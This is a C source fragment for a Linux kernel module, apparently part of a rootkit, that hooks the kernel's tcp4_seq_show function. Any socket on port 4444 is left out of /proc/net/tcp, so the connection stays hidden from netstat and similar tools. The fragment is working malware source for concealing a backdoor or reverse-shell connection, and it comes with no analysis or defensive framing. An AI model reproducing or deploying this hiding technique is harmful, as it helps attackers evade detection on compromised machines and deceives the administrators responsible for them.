#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <net/tcp.h>
#include "socket_hiding.h"

#define HIDE_PORT 4444

asmlinkage int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage int hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk;
    struct inet_sock *inet;

    if (v != SEQ_START_TOKEN) {
        sk = v;
        inet = inet_sk(sk);
        if (inet->inet_num == HIDE_PORT)
            return 0;
    }

    return real_tcp4_seq_show(seq, v);
}
